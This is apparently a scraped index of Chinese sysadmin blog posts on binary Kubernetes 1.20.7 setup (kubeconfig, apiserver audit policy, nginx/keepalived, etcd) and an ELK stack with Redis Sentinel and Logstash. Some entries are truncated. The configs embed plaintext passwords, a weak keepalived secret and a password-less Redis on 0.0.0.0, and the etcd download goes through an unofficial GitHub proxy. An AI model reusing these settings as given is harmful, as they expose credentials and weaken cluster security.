https://kubernetes.io/zh/docs/concepts/configuration/organize-cluster-access-kubeconfig/ https://kubernetes.io/docs/reference/generated/kubectl/kubectl-commands ","date":"2021-06-18 16:20","objectID":"/post/2478/:0:0","tags":["k8s"],"title":"kubernetes 1.20.7 二进制安装-kubectl客户端配置以及kubeconfig说明(六)","uri":"/post/2478/"},{"categories":["kubernetes"],"content":"1.安装kubectl # 具体装在哪台机器根据自己的需求 cp /server/packages/kubernetes/server/bin/kubectl /usr/local/bin/ # 配置completion补全增强 echo 'source \u003c(kubectl completion bash)' \u003e\u003e ~/.bashrc source ~/.bashrc ","date":"2021-06-18 16:20","objectID":"/post/2478/:0:1","tags":["k8s"],"title":"kubernetes 1.20.7 二进制安装-kubectl客户端配置以及kubeconfig说明(六)","uri":"/post/2478/"},{"categories":["kubernetes"],"content":"2.配置kubeconfig 默认情况下，kubectl在$HOME/.kube目录下查找名为config的文件。 也可以通过设置KUBECONFIG环境变量或者设置--kubeconfig参数来指定kubeconfig文件。 kubeconfig由集群信息,用户凭据,上下文组成，这些内容在一个配置文件中可以配置多个，所以kubeconfig支持多集群配置,并且可以通过上下文来切换集群。 下面我们使用kubectl命令生成一个kubeconfig配置文件 1.将群集信息添加到配置文件中 cd /etc/kubernetes/ # 配置apiserver地址、CA机构证书 kubectl config set-cluster kubernetes \\ --embed-certs=true \\ --certificate-authority=/etc/kubernetes/pki/ca/ca.pem \\ --server=https://172.17.20.200:6443 \\ --kubeconfig=admin.conf 参数说明: --set-cluster kubernetes: 后续的设置将对一个名为kubernetes的集群生效(不存在会在配置文件中添加) --embed-certs: 设置为true，将证书信息内嵌到配置文件中(默认是配置的证书路径) --certificate-authority: 指定一个信任的根CA，用于校验服务端证书 --server: 指定apiserver的地址 --kubeconfig: 指定配置文件路径 2.将用户认证信息添加到配置文件中 kubectl config set-credentials admin \\ --embed-certs=true \\ --client-certificate=/etc/kubernetes/pki/admin.pem \\ --client-key=/etc/kubernetes/pki/admin-key.pem \\ --kubeconfig=admin.conf 这时kubectl有了集群信息,用户认证信息，但还是不能使用，我们需要在添加一个上下文信息，用于表示哪个用户和哪个集群绑定 参数说明: set-credentials admin: 对当前用户设置一个名称(随便起) --embed-certs: 设置为true，将证书信息内嵌到配置文件中(默认是配置的证书路径) --client-certificate: 访问apiserver使用的证书 --client-key: 访问apiserver使用的证书的私钥 --kubeconfig: 指定配置文件路径 3.将上下文(context)信息添加到配置文件中 kubectl config set-context kubernetes \\ --cluster=kubernetes \\ --user=admin \\ --kubeconfig=admin.conf 将admin用户与kubernetes这个集群绑定,这时通过kubectl cluster info –kubeconfig=admin.conf –context=kubernetes就可以使用了，但是指定上下文很不方便，我们下一步设置一个默认的上下文 set-context kubernetes: 上下文的名称 --cluster: 指定哪个集群 --user: 指定哪个用户 --kubeconfig: 指定配置文件路径 4.指定默认要使用哪个上下文配置 kubectl config use-context kubernetes --kubeconfig=admin.conf 5.复制配置文件到默认查找目录 cp admin.conf ~/.kube/config ","date":"2021-06-18 16:20","objectID":"/post/2478/:0:2","tags":["k8s"],"title":"kubernetes 1.20.7 二进制安装-kubectl客户端配置以及kubeconfig说明(六)","uri":"/post/2478/"},{"categories":["kubernetes"],"content":"3.测试是否正常使用 kubectl cluster-info kubectl get svc ","date":"2021-06-18 16:20","objectID":"/post/2478/:0:3","tags":["k8s"],"title":"kubernetes 1.20.7 二进制安装-kubectl客户端配置以及kubeconfig说明(六)","uri":"/post/2478/"},{"categories":["系统服务","kubernetes"],"content":"一、安装apiserver 1.下载server包 cd /server/packages/ wget https://dl.k8s.io/v1.20.7/kubernetes-server-linux-amd64.tar.gz # 分发到其他机器 for i in {202..203};do scp kubernetes-server-linux-amd64.tar.gz 172.17.20.$i:`pwd` ;done 2.安装apiserver # 三台机器执行 tar xf kubernetes-server-linux-amd64.tar.gz cp kubernetes/server/bin/kube-apiserver /usr/local/bin 3.创建审计日志策略配置文件 None - 符合这条规则的日志将不会记录 Metadata - 记录请求的元数据（请求的用户、时间戳、资源、动词等等）， 但是不记录请求或者响应的消息体。 Request - 记录事件的元数据和请求的消息体，但是不记录响应的消息体。 这不适用于非资源类型的请求。 RequestResponse - 记录事件的元数据，请求和响应的消息体。这不适用于非资源类型的请求。 审计配置的api文档:https://kubernetes.io/zh/docs/reference/config-api/apiserver-audit.v1/#resource-types 下面配置来源kubernetes code cat \u003e /etc/kubernetes/audit-policy.yaml \u003c\u003cEOF apiVersion: audit.k8s.io/v1 kind: Policy rules: # 不记录一些高容量和低风险的日志. - level: None users: [\"system:kube-proxy\"] verbs: [\"watch\"] resources: - group: \"\" # core resources: [\"endpoints\", \"services\", \"services/status\"] - level: None # Ingress controller reads 'configmaps/ingress-uid' through the unsecured port. # TODO(#46983): Change this to the ingress controller service account. users: [\"system:unsecured\"] namespaces: [\"kube-system\"] verbs: [\"get\"] resources: - group: \"\" # core resources: [\"configmaps\"] - level: None users: [\"kubelet\"] # legacy kubelet identity verbs: [\"get\"] resources: - group: \"\" # core resources: [\"nodes\", \"nodes/status\"] - level: None userGroups: [\"system:nodes\"] verbs: [\"get\"] resources: - group: \"\" # core resources: [\"nodes\", \"nodes/status\"] - level: None users: - system:kube-controller-manager - system:kube-scheduler - system:serviceaccount:kube-system:endpoint-controller verbs: [\"get\", \"update\"] namespaces: [\"kube-system\"] resources: - group: \"\" # core resources: [\"endpoints\"] - level: None users: [\"system:apiserver\"] verbs: [\"get\"] resources: - group: \"\" # core resources: [\"namespaces\", \"namespaces/status\", \"namespaces/finalize\"] - level: None users: [\"cluster-autoscaler\"] verbs: [\"get\", \"update\"] namespaces: [\"kube-system\"] resources: - group: \"\" # core resources: [\"configmaps\", \"endpoints\"] # Don't log HPA fetching metrics. - level: None users: - system:kube-controller-manager verbs: [\"get\", \"list\"] resources: - group: \"metrics.k8s.io\" # Don't log these read-only URLs. - level: None nonResourceURLs: - /healthz* - /version - /swagger* # Don't log events requests because of performance impact. - level: None resources: - group: \"\" # core resources: [\"events\"] # node and pod status calls from nodes are high-volume and can be large, don't log responses for expected updates from nodes - level: Request users: [\"kubelet\", \"system:node-problem-detector\", \"system:serviceaccount:kube-system:node-problem-detector\"] verbs: [\"update\",\"patch\"] resources: - group: \"\" # core resources: [\"nodes/status\", \"pods/status\"] omitStages: - \"RequestReceived\" - level: Request userGroups: [\"system:nodes\"] verbs: [\"update\",\"patch\"] resources: - group: \"\" # core resources: [\"nodes/status\", \"pods/status\"] omitStages: - \"RequestReceived\" # deletecollection calls can be large, don't log responses for expected namespace deletions - level: Request users: [\"system:serviceaccount:kube-system:namespace-controller\"] verbs: [\"deletecollection\"] omitStages: - \"RequestReceived\" # Secrets, ConfigMaps, TokenRequest and TokenReviews can contain sensitive \u0026 binary data, # so only log at the Metadata level. - level: Metadata resources: - group: \"\" # core resources: [\"secrets\", \"configmaps\", \"serviceaccounts/token\"] - group: authentication.k8s.io resources: [\"tokenreviews\"] omitStages: - \"RequestReceived\" # Get responses can be large; skip them. - level: Request verbs: [\"get\", \"list\", \"watch\"] resources: - group: \"\" # core - group: \"admissionregistration.k8s.io\" - group: \"apiextensions.k8s.io\" - group: \"apiregistration.k8s.io\" - group: \"apps\" - group: \"authentication.k8s.io\" - group: \"authorization.k8s.io\" - group: \"autoscaling\" - group: \"batch\" - group: \"certificates.k8s.io\" - group: \"extensions\" - group: \"metrics.k8s.io\" - group: \"networking.k8s.io\" - group: \"no","date":"2021-06-17 15:25","objectID":"/post/2473/:0:1","tags":["nginx","keepalievd","k8s"],"title":"kubernetes 1.20.7 二进制安装-apiserver+nginx+keepalived(五) ","uri":"/post/2473/"},{"categories":["系统服务","kubernetes"],"content":"二、安装配置nginx 1. 安装 mkdir /server/packages/ -p cd /server/packages/ wget http://nginx.org/download/nginx-1.16.1.tar.gz tar xf nginx-1.16.1.tar.gz cd nginx-1.16.1/ ./configure --prefix=/usr/local/nginx --with-stream --without-http --without-http_uwsgi_module 编译参数说明: --with-stream: 开启tcp/udp代理 --without-http: 禁用http服务器 --without-http_uwsgi_module: 禁用uwsgi传输功能 2.配置 两台nginx相同 cat \u003e /usr/local/nginx/conf/nginx.conf \u003c\u003cEOF worker_processes auto; error_log logs/error.log; pid logs/nginx.pid; events { worker_connections 1024; } stream { log_format main '$remote_addr [$time_local] ' '$protocol $status $bytes_sent $bytes_received ' '$session_time \"$upstream_addr\" ' '\"$upstream_bytes_sent\" \"$upstream_bytes_received\" \"$upstream_connect_time\"'; access_log logs/access.log main; upstream kube-apiserver { hash $remote_addr consistent; server 172.17.20.201:6443 max_fails=3 fail_timeout=10s; server 172.17.20.202:6443 max_fails=3 fail_timeout=10s; server 172.17.20.203:6443 max_fails=3 fail_timeout=10s; } server { listen 6443; proxy_connect_timeout 1s; proxy_pass kube-apiserver; } } EOF 3.启动服务 /usr/local/nginx/sbin/nginx ","date":"2021-06-17 15:25","objectID":"/post/2473/:0:2","tags":["nginx","keepalievd","k8s"],"title":"kubernetes 1.20.7 二进制安装-apiserver+nginx+keepalived(五) ","uri":"/post/2473/"},{"categories":["系统服务","kubernetes"],"content":"三、安装keepalived 1. 安装 yum install -y keepalived 2.配置 nginx01的keepalived cat \u003e /etc/keepalived/keepalived.conf \u003c\u003cEOF global_defs { router_id nginx01 } # 定义一个状态检查,script中也可以写一个脚本，但脚本需有返回值 vrrp_script check_nginx { # 每2秒检查一次nginx进程状态，根据命令执行的状态码去判断服务是否正常 script \"/usr/bin/killall -0 nginx\" interval 2 # 2次状态吗为非0才为失败状态 fall 2 # 2次状态码为0才为正常状态 rise 2 } vrrp_instance nginx { # 设置为master state MASTER # 指定vip绑定网卡 interface eth0 # vrrp标识1-255(需要和备节点一致) virtual_router_id 51 # 指定优先级，优先级高的会优先成为master priority 100 # 组播包间隔时间 advert_int 1 # 认证 authentication { auth_type PASS auth_pass 1111 } # 配置vip virtual_ipaddress { 172.17.20.200 } # 引用上面定义的状态检查 track_script { check_nginx } } EOF nginx02的keepalived cat \u003e /etc/keepalived/keepalived.conf \u003c\u003cEOF global_defs { router_id nginx02 } # 定义一个状态检查,script中也可以写一个脚本，但脚本需有返回值 vrrp_script check_nginx { # 每2秒检查一次nginx进程状态，根据命令执行的状态码去判断服务是否正常 script \"/usr/bin/killall -0 nginx\" interval 2 # 2次状态吗为非0才为失败状态 fall 2 # 2次状态码为0才为正常状态 rise 2 } vrrp_instance nginx { # 设置为master state BACKUP # 指定vip绑定网卡 interface eth0 # vrrp标识1-255(需要和备节点一致) virtual_router_id 51 # 指定优先级，优先级高的会优先成为master priority 99 # 组播包间隔时间 advert_int 1 # 认证 authentication { auth_type PASS auth_pass 1111 } # 配置vip virtual_ipaddress { 172.17.20.200 } # 引用上面定义的状态检查 track_script { check_nginx } } EOF 3.启动服务 systemctl start keepalived systemctl enable keepalived 4.验证vip漂移 停止nginx01的keepalived,观察vip是否会漂移到nginx02上 启动nginx01的keepalived,观察vip是否会漂移到nginx01上(当前配置是抢占模式，nginx01恢复后会抢占VIP) ","date":"2021-06-17 15:25","objectID":"/post/2473/:0:3","tags":["nginx","keepalievd","k8s"],"title":"kubernetes 1.20.7 二进制安装-apiserver+nginx+keepalived(五) ","uri":"/post/2473/"},{"categories":["ELK日志收集"],"content":"机器规划： |主机 |IP |服务 |备注| |— |ops-elk-es01 |172.17.10.161 |redis+sentinel、logstash、es、kibana|redis vip:172.17.10.164 ops-elk-es02 |172.17.10.162 |redis+sentinel、logstash、es、kibana|n | ops-elk-es03 |172.17.10.163 |redis+sentinel、logstash、es| n| ","date":"2021-06-17 13:46","objectID":"/post/2474/:1:0","tags":["elk"],"title":"ELK平台建设","uri":"/post/2474/"},{"categories":["ELK日志收集"],"content":"架构图: 46788-unuyv5rlvg.png ","date":"2021-06-17 13:46","objectID":"/post/2474/:2:0","tags":["elk"],"title":"ELK平台建设","uri":"/post/2474/"},{"categories":["ELK日志收集"],"content":"一、安装配置ES集群 ","date":"2021-06-17 13:46","objectID":"/post/2474/:3:0","tags":["elk"],"title":"ELK平台建设","uri":"/post/2474/"},{"categories":["ELK日志收集"],"content":"1.下载二进制包 wget -O /server/packages/elasticsearch-7.8.1-linux-x86_64.tar.gz https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-7.8.1-linux-x86_64.tar.gz ","date":"2021-06-17 13:46","objectID":"/post/2474/:3:1","tags":["elk"],"title":"ELK平台建设","uri":"/post/2474/"},{"categories":["ELK日志收集"],"content":"2.解压安装 tar xf elasticsearch-7.8.1-linux-x86_64.tar.gz -C /usr/local/ ","date":"2021-06-17 13:46","objectID":"/post/2474/:3:2","tags":["elk"],"title":"ELK平台建设","uri":"/post/2474/"},{"categories":["ELK日志收集"],"content":"3.优化 vim /etc/sysctl.conf fs.file-max=655360 vm.max_map_count = 262144 重新加载配置 sysctl -p vim /etc/security/limits.conf * soft nproc 20480 * hard nproc 20480 * soft nofile 65536 * hard nofile 65536 * soft memlock unlimited * hard memlock unlimited vim /etc/security/limits.d/20-nproc.conf * soft nproc 40960 root soft nproc unlimited ","date":"2021-06-17 13:46","objectID":"/post/2474/:3:3","tags":["elk"],"title":"ELK平台建设","uri":"/post/2474/"},{"categories":["ELK日志收集"],"content":"4.修改es配置 vim /usr/local/elasticsearch-7.8.1/config/elasticsearch.yml cluster.name: elk-cluster node.name: node-1 path.data: /data/es/ path.logs: /usr/local/elasticsearch-7.8.1/logs bootstrap.memory_lock: true network.host: 0.0.0.0 http.port: 9200 discovery.zen.minimum_master_nodes: 2 cluster.initial_master_nodes: [\"172.17.10.161:9300\"] discovery.zen.ping.unicast.hosts: [\"172.17.10.161:9300\",\"172.17.10.162:9300\",\"172.17.10.163:9300\"] xpack.security.enabled: true xpack.security.transport.ssl.enabled: true xpack.security.transport.ssl.verification_mode: certificate # 证书认证级别 xpack.security.transport.ssl.keystore.path: elastic-certificates.p12 xpack.security.transport.ssl.truststore.path: elastic-certificates.p12 ","date":"2021-06-17 13:46","objectID":"/post/2474/:3:4","tags":["elk"],"title":"ELK平台建设","uri":"/post/2474/"},{"categories":["ELK日志收集"],"content":"5.创建用户、es数据目录 useradd elasticsearch chown -R elasticsearch.elasticsearch /usr/local/elasticsearch-7.8.1 mkdir /data/es -p chown -R elasticsearch.elasticsearch /data/es ","date":"2021-06-17 13:46","objectID":"/post/2474/:3:5","tags":["elk"],"title":"ELK平台建设","uri":"/post/2474/"},{"categories":["ELK日志收集"],"content":"6.生成证书 cd /usr/local/elasticsearch-7.8.1 bin/elasticsearch-certutil ca bin/elasticsearch-certutil cert --ca elastic-stack-ca.p12 # 修改权限 chown elasticsearch.elasticsearch elastic-*.p12 # 拷贝到配置文件目录 mv elastic-*.p12 config/ ","date":"2021-06-17 13:46","objectID":"/post/2474/:3:6","tags":["elk"],"title":"ELK平台建设","uri":"/post/2474/"},{"categories":["ELK日志收集"],"content":"7.配置连接es的各个账户密码 bin/elasticsearch-setup-passwords interactive 我设置的是loados-ops ","date":"2021-06-17 13:46","objectID":"/post/2474/:3:7","tags":["elk"],"title":"ELK平台建设","uri":"/post/2474/"},{"categories":["ELK日志收集"],"content":"8.启动脚本 vim /etc/init.d/es #!/bin/bash #chkconfig: 35 90 90 ES_BIN=/usr/local/elasticsearch-7.8.1/bin/ function pid_is_exist(){ ps -ef | grep [e]lasticsearch | grep -v x-pack-ml \u003e /dev/null 2\u003e\u00261 return $? } function start(){ w=`whoami` [[ $w == \"elasticsearch\" ]] \u0026\u0026 $ES_BIN/elasticsearch -d || su - elasticsearch -c \"$ES_BIN/elasticsearch -d\" } function stop(){ pid_is_exist if [[ $? != 0 ]] then echo \"服务未启动\" exit fi ps -ef | grep [e]lasticsearch | grep -v x-pack-ml | awk '{print $2}' | xargs kill pid_is_exist [[ $? == 0 ]] \u0026\u0026 echo 停止成功 || read -p 停止失败是否,强制停止: isforce [[ $isforce == \"y\" ]] \u0026\u0026 ps -ef | grep [e]lasticsearch | grep -v x-pack-ml | awk '{print $2}' | xargs kill -9 } case $1 in start) start ;; stop) stop ;; restart) stop start ;; *) echo Usage: $0 \"start|stop|restart\" ;; esac 添加服务开机启动 chkconfig --add es ","date":"2021-06-17 13:46","objectID":"/post/2474/:3:8","tags":["elk"],"title":"ELK平台建设","uri":"/post/2474/"},{"categories":["ELK日志收集"],"content":"9.启动服务 service es start ","date":"2021-06-17 13:46","objectID":"/post/2474/:3:9","tags":["elk"],"title":"ELK平台建设","uri":"/post/2474/"},{"categories":["ELK日志收集"],"content":"10.安装其他节点 修改第四步中的配置信息 第六步不需要重新生成，把之前生成的证书拷贝到新节点即可 第七步无需执行 其他步骤相同 ","date":"2021-06-17 13:46","objectID":"/post/2474/:3:10","tags":["elk"],"title":"ELK平台建设","uri":"/post/2474/"},{"categories":["ELK日志收集"],"content":"二、安装配置redis哨兵模式 ","date":"2021-06-17 13:46","objectID":"/post/2474/:4:0","tags":["elk"],"title":"ELK平台建设","uri":"/post/2474/"},{"categories":["ELK日志收集"],"content":"1.安装redis yum install -y gcc-c++ cd /server/packages wget http://download.redis.io/releases/redis-5.0.5.tar.gz tar xf redis-5.0.5.tar.gz cd redis-5.0.5 make make install ","date":"2021-06-17 13:46","objectID":"/post/2474/:4:1","tags":["elk"],"title":"ELK平台建设","uri":"/post/2474/"},{"categories":["ELK日志收集"],"content":"2.整合redis mkdir /usr/local/redis/{etc,bin,log} -p cp redis.conf sentinel.conf /usr/local/redis/etc/ cd src cp mkreleasehdr.sh redis-benchmark redis-check-aof redis-check-rdb redis-cli redis-sentinel redis-server redis-trib.rb /usr/local/redis/bin/ 整合后可以复用，分发到其他节点 ","date":"2021-06-17 13:46","objectID":"/post/2474/:4:2","tags":["elk"],"title":"ELK平台建设","uri":"/post/2474/"},{"categories":["ELK日志收集"],"content":"3.配置环境变量 echo 'export PATH=$PATH:/usr/local/redis/bin' \u003e\u003e /etc/profile source /etc/profile ","date":"2021-06-17 13:46","objectID":"/post/2474/:4:3","tags":["elk"],"title":"ELK平台建设","uri":"/post/2474/"},{"categories":["ELK日志收集"],"content":"4.调优 echo -e 'vm.overcommit_memory=1\\nnet.core.somaxconn=2048' \u003e\u003e /etc/sysctl.conf # 重新加载配置 sysctl -p ","date":"2021-06-17 13:46","objectID":"/post/2474/:4:4","tags":["elk"],"title":"ELK平台建设","uri":"/post/2474/"},{"categories":["ELK日志收集"],"content":"5.修改配置文件 vim /usr/local/redis/etc/redis.conf bind 0.0.0.0 protected-mode yes port 6379 tcp-backlog 2048 timeout 0 tcp-keepalive 300 daemonize yes supervised systemd pidfile \"/var/run/redis_6379.pid\" loglevel notice logfile \"/usr/local/redis/log/access.log\" databases 16 always-show-logo yes save 900 1 save 300 10 save 60 10000 stop-writes-on-bgsave-error yes rdbcompression yes rdbchecksum yes dbfilename \"dump.rdb\" dir \"/usr/local/redis\" replica-serve-stale-data yes replica-read-only yes repl-diskless-sync no repl-diskless-sync-delay 5 repl-disable-tcp-nodelay no replica-priority 100 lazyfree-lazy-eviction no lazyfree-lazy-expire no lazyfree-lazy-server-del no replica-lazy-flush no appendonly no appendfilename \"appendonly.aof\" appendfsync everysec no-appendfsync-on-rewrite no auto-aof-rewrite-percentage 100 auto-aof-rewrite-min-size 64mb aof-load-truncated yes aof-use-rdb-preamble yes lua-time-limit 5000 slowlog-log-slower-than 10000 slowlog-max-len 128 latency-monitor-threshold 0 notify-keyspace-events \"\" hash-max-ziplist-entries 512 hash-max-ziplist-value 64 list-max-ziplist-size -2 list-compress-depth 0 set-max-intset-entries 512 zset-max-ziplist-entries 128 zset-max-ziplist-value 64 hll-sparse-max-bytes 3000 stream-node-max-bytes 4096 stream-node-max-entries 100 activerehashing yes client-output-buffer-limit normal 0 0 0 client-output-buffer-limit replica 256mb 64mb 60 client-output-buffer-limit pubsub 32mb 8mb 60 hz 10 dynamic-hz yes aof-rewrite-incremental-fsync yes rdb-save-incremental-fsync yes maxclients 4064 如果是从节点，需要指向主节点，添加如下配置项 slaveof 172.17.10.161 6379 ","date":"2021-06-17 13:46","objectID":"/post/2474/:4:5","tags":["elk"],"title":"ELK平台建设","uri":"/post/2474/"},{"categories":["ELK日志收集"],"content":"6.配置sentinel vim /usr/local/redis/etc/sentinel.conf daemonize yes port 26379 logfile /var/log/redis/redis-sentinel.log pidfile /var/run/redis-sentinel.pid sentinel monitor elk 172.17.10.161 6379 2 sentinel down-after-milliseconds elk 3000 sentinel failover-timeout elk 20000 sentinel parallel-syncs elk 1 sentinel client-reconfig-script elk /server/scripts/redis_sentinel.sh 三个节点同样的配置 ","date":"2021-06-17 13:46","objectID":"/post/2474/:4:6","tags":["elk"],"title":"ELK平台建设","uri":"/post/2474/"},{"categories":["ELK日志收集"],"content":"7.创建启动用户 useradd -r redis \u0026\u0026 chown -R redis.redis /usr/local/redis/ ","date":"2021-06-17 13:46","objectID":"/post/2474/:4:7","tags":["elk"],"title":"ELK平台建设","uri":"/post/2474/"},{"categories":["ELK日志收集"],"content":"8.配置systemd脚本 redis-server vim /etc/systemd/system/redis.service [Unit] Description=Redis persistent key-value database After=network.target After=network-online.target Wants=network-online.target [Service] ExecStart=/usr/local/redis/bin/redis-server /usr/local/redis/etc/redis.conf --supervised systemd Type=notify User=redis Group=redis [Install] WantedBy=multi-user.target redis-sentinel vim /etc/systemd/system/redis-sentinel.service [Unit] Description=Redis Sentinel After=network.target After=network-online.target Wants=network-online.target [Service] ExecStart=/usr/local/redis/bin/redis-sentinel /usr/local/redis/etc/sentinel.conf --supervised systemd Type=notify #User=redis #Group=redis [Install] WantedBy=multi-user.target ","date":"2021-06-17 13:46","objectID":"/post/2474/:4:8","tags":["elk"],"title":"ELK平台建设","uri":"/post/2474/"},{"categories":["ELK日志收集"],"content":"9.配置VIP漂移脚本 每个sentinel节点都需要添加如下脚本 vim /server/scripts/redis_sentinel.sh #!/bin/bash MASTER_IP=${6} VIP='172.17.10.164' NETMASK='24' INTERFACE='eth0' MY_IP=`ip a s dev ${INTERFACE} | awk 'NR==3{split($2,ip,\"/\");print ip[1]}'` if [ ${MASTER_IP} = ${MY_IP} ]; then /sbin/ip addr add ${VIP}/${NETMASK} dev ${INTERFACE} /sbin/arping -q -c 3 -A ${VIP} -I ${INTERFACE} exit 0 else /sbin/ip addr del ${VIP}/${NETMASK} dev ${INTERFACE} exit 0 fi exit 1 ","date":"2021-06-17 13:46","objectID":"/post/2474/:4:9","tags":["elk"],"title":"ELK平台建设","uri":"/post/2474/"},{"categories":["ELK日志收集"],"content":"10.启动服务 systemctl start redis systemctl enable redis systemctl start redis-sentinel systemctl enable redis-sentinel ","date":"2021-06-17 13:46","objectID":"/post/2474/:4:10","tags":["elk"],"title":"ELK平台建设","uri":"/post/2474/"},{"categories":["ELK日志收集"],"content":"三、filebeat ","date":"2021-06-17 13:46","objectID":"/post/2474/:5:0","tags":["elk"],"title":"ELK平台建设","uri":"/post/2474/"},{"categories":["ELK日志收集"],"content":"1.安装filebeat yum install -y https://artifacts.elastic.co/downloads/beats/filebeat/filebeat-7.8.1-x86_64.rpm ","date":"2021-06-17 13:46","objectID":"/post/2474/:5:1","tags":["elk"],"title":"ELK平台建设","uri":"/post/2474/"},{"categories":["ELK日志收集"],"content":"2.filebeat配置 java filebeat.inputs: - type: log enable: true paths: [\"/data/log/szjj-server/*.log\"] exclude_files: [\"/data/log/szjj-server/blade-log.log\"] fields_under_root: true fields: log_type: \"blade_java\" project: \"szjj_base_platform\" env: \"test\" scan_frequency: 5s multiline.pattern: ^\\d{4}-\\d{1,2}-\\d{1,2}|^\\d{2}:\\d{2}:\\d{2}\\.\\d+ multiline.negate: true multiline.match: after multiline.max_lines: 1000 processors: - add_host_metadata: netinfo.enabled: true - drop_fields: fields: - input - agent - ecs - beat - prospector - name - host.architecture - host.os - host.id - host.containerized - host.mac - host.name output.redis: hosts: [\"172.17.10.164\"] datatype: \"list\" db: 0 key: \"%{[project]}_%{[env]}\" nginx filebeat.inputs: - type: log paths: - /usr/local/nginx/logs/*_access.log fields_under_root: true fields: log_type: nginx_access env: prod json: keys_under_root: true overwrite_keys: true - type: log paths: - /usr/local/nginx/logs/*_error.log fields_under_root: true fields: log_type: nginx_error env: prod processors: - add_host_metadata: netinfo.enabled: true - drop_fields: fields: - input - agent - ecs - beat - prospector - name - host.architecture - host.os - host.id - host.containerized - host.mac - host.name output.redis: hosts: [\"172.17.10.164\"] datatype: \"list\" db: 0 key: \"nginx_prod\" ","date":"2021-06-17 13:46","objectID":"/post/2474/:5:2","tags":["elk"],"title":"ELK平台建设","uri":"/post/2474/"},{"categories":["ELK日志收集"],"content":"四、logstash配置 ","date":"2021-06-17 13:46","objectID":"/post/2474/:6:0","tags":["elk"],"title":"ELK平台建设","uri":"/post/2474/"},{"categories":["ELK日志收集"],"content":"1.input部分配置 input { redis { data_type =\u003e \"list\" db =\u003e 0 host =\u003e \"172.17.10.164\" key =\u003e \"szjj_base_platform_test\" } redis { data_type =\u003e \"list\" db =\u003e 0 host =\u003e \"172.17.10.164\" key =\u003e \"szjj_base_platform_prod\" } redis { data_type =\u003e \"list\" db =\u003e 0 host =\u003e \"172.17.10.164\" key =\u003e \"bpms_test\" } redis { data_type =\u003e \"list\" db =\u003e 0 host =\u003e \"172.17.10.164\" key =\u003e \"bpms_prod\" } redis { data_type =\u003e \"list\" db =\u003e 0 host =\u003e \"172.17.10.164\" key =\u003e \"nginx_test\" } redis { data_type =\u003e \"list\" db =\u003e 0 host =\u003e \"172.17.10.164\" key =\u003e \"nginx_prod\" } } ","date":"2021-06-17 13:46","objectID":"/post/2474/:6:1","tags":["elk"],"title":"ELK平台建设","uri":"/post/2474/"},{"categories":["ELK日志收集"],"content":"2.filter部分配置 filter { mutate { add_field =\u003e { \"handler\" =\u003e \"${HOSTNAME:logstash-01}\" } } if [log_type] == \"blade_java\" { mutate { copy =\u003e { \"[log][file][path]\" =\u003e \"tmp\" } copy =\u003e { \"message\" =\u003e \"originnal\" } } grok { keep_empty_captures =\u003e true pattern_definitions =\u003e { \"MYJAVADATE\" =\u003e \"\\d{4}-\\d{2}-\\d{2} \\d{2}:\\d{2}:\\d{2}\\.\\d{3}\" } overwrite =\u003e [ \"message\" ] match=\u003e{ \"message\" =\u003e [ \"%{MYJAVADATE:date}[ ]+%{LOGLEVEL:level}[ ]+%{POSINT:pid}[ ]+---[ ]+(?\u003clogger\u003e.*?)[ ]+:[ ]+(?\u003cmessage\u003e.*[\\n]+=+.*$)\", \"%{MYJAVADATE:date}[ ]+%{LOGLEVEL:level}[ ]+%{POSINT:pid}[ ]+---[ ]+(?\u003clogger\u003e.*?)[ ]+:[ ]+%{DATA:message}\\n(?\u003cexception\u003e.*$)\", \"%{MYJAVADATE:date}[ ]+%{LOGLEVEL:level}[ ]+%{POSINT:pid}[ ]+---[ ]+(?\u003clogger\u003e.*?)[ ]+:[ ]+%{DATA:message}$\" ] } } date { match =\u003e [\"date\", \"yyyy-MM-dd HH:mm:ss.SSS\"] } mutate { gsub =\u003e [ \"tmp\", \".log\", \"\" ] split =\u003e { \"tmp\" =\u003e \"/\" } add_field =\u003e { \"app\" =\u003e \"%{[tmp][-1]}\" } remove_field =\u003e [\"tmp\"] } } else if [log_type] == \"springboot_java\" { grok { keep_empty_captures =\u003e true match =\u003e { \"message\" =\u003e \"^(?\u003cdate\u003e\\d{4}-\\d{2}-\\d{2} \\d{2}:\\d{2}:\\d{2}\\.\\d{3})\" } } date { match =\u003e [\"date\", \"yyyy-MM-dd HH:mm:ss.SSS\"] } mutate { copy =\u003e { \"message\" =\u003e \"originnal\" } } } } ","date":"2021-06-17 13:46","objectID":"/post/2474/:6:2","tags":["elk"],"title":"ELK平台建设","uri":"/post/2474/"},{"categories":["ELK日志收集"],"content":"3.output部分配置 output{ if [log_type] == \"blade_java\" or [log_type] == \"springboot_java\" { elasticsearch { hosts =\u003e [\"172.17.10.161:9200\", \"172.17.10.162:9200\", \"172.17.10.163:9200\"] index =\u003e \"%{project}-%{env}-%{app}-%{+yyyy.MM.dd}\" user =\u003e \"log_agent\" password =\u003e \"loados-log\" } } if [log_type] in [\"nginx_access\", \"nginx_error\"] { elasticsearch { hosts =\u003e [\"172.17.10.161:9200\", \"172.17.10.162:9200\", \"172.17.10.163:9200\"] index =\u003e \"%{log_type}-%{env}-%{+yyyy.MM.dd}\" user =\u003e \"log_agent\" password =\u003e \"loados-log\" } } } ","date":"2021-06-17 13:46","objectID":"/post/2474/:6:3","tags":["elk"],"title":"ELK平台建设","uri":"/post/2474/"},{"categories":["系统服务","kubernetes"],"content":"一、下载二进制包 mkdir /server/packages/ -p cd /server/packages/ # 下载 wget https://github.91chifun.workers.dev/https://github.com//etcd-io/etcd/releases/download/v3.4.16/etcd-v3.4.16-linux-amd64.tar.gz # 分发到其他机器 for i in {202..203};do scp etcd-v3.4.16-linux-amd64.tar.gz 172.17.20.$i:`pwd` ;done ","date":"2021-06-16 10:46","objectID":"/post/2467/:0:1","tags":["k8s","etcd"],"title":"kubernetes 1.20.7 二进制安装-etcd高可用部署(四)","uri":"/post/2467/"},{"categories":["系统服务","kubernetes"],"content":"二、安装etcd # 三台执行 cd /server/packages/ tar xf etcd-v3.4.16-linux-amd64.tar.gz mv etcd-v3.4.16-linux-amd64/etcd* /usr/local/bin/ # 创建相关目录 mkdir /data/etcd/{data,wal} -p ","date":"2021-06-16 10:46","objectID":"/post/2467/:0:2","tags":["k8s","etcd"],"title":"kubernetes 1.20.7 二进制安装-etcd高可用部署(四)","uri":"/post/2467/"},{"categories":["系统服务","kubernetes"],"content":"三、分发证书 for i in {202..203};do scp -r /etc/kubernetes/ 172.17.20.$i:/etc/kubernetes/ ;done ","date":"2021-06-16 10:46","objectID":"/post/2467/:0:3","tags":["k8s","etcd"],"title":"kubernetes 1.20.7 